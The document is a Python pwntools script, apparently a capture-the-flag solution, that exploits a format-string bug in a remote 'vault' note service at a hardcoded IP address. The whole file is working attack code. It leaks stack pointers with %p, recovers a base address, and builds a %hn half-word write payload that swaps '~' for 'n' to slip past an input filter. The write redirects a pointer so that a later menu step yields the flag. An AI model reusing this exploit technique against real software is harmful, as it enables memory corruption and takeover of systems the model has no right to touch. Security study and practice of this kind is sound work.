from pwn import *
import sys
from collections import defaultdict

context.log_level = "info"

HOST = sys.argv[1] if len(sys.argv) > 1 else "159.65.221.238"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337

VAULT_LEAK_OFFSETS = (0x7, 0x13, 0x21, 0x2D)
SECOND_VAULT_OFF = 0x28
ACTIVE_PTR_HALFWORD_ARGS = (3, 4, 5)


def start():
    return remote(HOST, PORT)


def clean_int(s: bytes):
    s = s.strip()

    if not s or s == b"(nil)":
        return None
    try:
        return int(s, 16)
    except ValueError:
        return None


def menu(io, choice: int):
    io.sendlineafter(b"> ", str(choice).encode())


def set_note(io, payload: bytes, width: int = 0x41):
    assert b"n" not in payload, "payload must not contain literal 'n'; use '~' for %n"
    assert len(payload) < 0x60, f"note too long: {len(payload)} bytes"
    menu(io, 2)
    io.sendlineafter(b"width> ", str(width).encode())
    io.sendlineafter(b"note> ", payload)


def review(io) -> bytes:
    menu(io, 3)
    io.recvuntil(b"[buyer note review]\n")
    return io.recvuntil(b"\n[end review]", drop=True)


def leak_slots(io, start_idx: int, end_idx: int):
    payload = b"|".join(f"%{i}$p".encode() for i in range(start_idx, end_idx + 1))
    set_note(io, payload)
    out = review(io)

    vals = {}
    parts = out.split(b"|")
    for idx, raw in zip(range(start_idx, end_idx + 1), parts):
        vals[idx] = clean_int(raw)
    return vals, out


def leak_all(io, upto: int = 32, chunk: int = 8):
    leaks = {}
    for lo in range(1, upto + 1, chunk):
        hi = min(upto, lo + chunk - 1)
        vals, raw = leak_slots(io, lo, hi)
        leaks.update(vals)
        log.info("leak %02d..%02d: %s", lo, hi, raw.decode(errors="replace"))
    return leaks


def recover(leaks: dict[int, int | None]) -> int:
    by_base = defaultdict(list)

    for idx, ptr in leaks.items():
        if ptr is None:
            continue
        for off in VAULT_LEAK_OFFSETS:
            base = ptr - off
            if base > 0 and (base & 0xF) == 0:
                by_base[base].append((idx, ptr, off))

    ranked = sorted(
        by_base.items(),
        key=lambda item: (len(item[1]), len({x[2] for x in item[1]})),
        reverse=True,
    )

    best_base, evidence = ranked[0]
    if len(evidence) < 2:
        log.warning("weak vault-base evidence: %r", evidence)
    else:
        log.info("vault-base evidence: %s", ", ".join(
            f"%{idx}$p={ptr:#x}-0x{off:x}" for idx, ptr, off in evidence
        ))

    return best_base


def hn_writes(writes, filler_arg: int = 1) -> bytes:
    count = 0
    out = b""

    # minimizes wraparound padding
    for arg_idx, value in sorted(writes, key=lambda x: x[1] & 0xFFFF):
        value &= 0xFFFF
        delta = (value - count) & 0xFFFF
        if delta:
            out += f"%{filler_arg}${delta}c".encode()
            count = (count + delta) & 0xFFFF
        out += f"%{arg_idx}$h~".encode()

    return out


def build_payload(target_ptr: int) -> bytes:
    words = [
        target_ptr & 0xFFFF,
        (target_ptr >> 16) & 0xFFFF,
        (target_ptr >> 32) & 0xFFFF,
    ]
    writes = list(zip(ACTIVE_PTR_HALFWORD_ARGS, words))
    log.info("active_vault target = %#x", target_ptr)
    log.info("halfword writes: %s", ", ".join(
        f"%{arg}$hn <- 0x{val:04x}" for arg, val in writes
    ))
    return hn_writes(writes)


def exploit():
    io = start()

    leaks = leak_all(io, upto=32, chunk=8)

    vault_base = recover(leaks)
    second_vault = vault_base + SECOND_VAULT_OFF
    log.success("vault base: %#x", vault_base)
    log.success("second vault: %#x", second_vault)

    payload = build_payload(second_vault)
    log.info("payload len=%d: %r", len(payload), payload)

    # %h~ payload
    set_note(io, payload)

    # rewrites ~ to n, checksum
    menu(io, 4)

    # wait menu
    review(io)

    # get the flag
    menu(io, 5)
    io.interactive()


if __name__ == "__main__":
    exploit()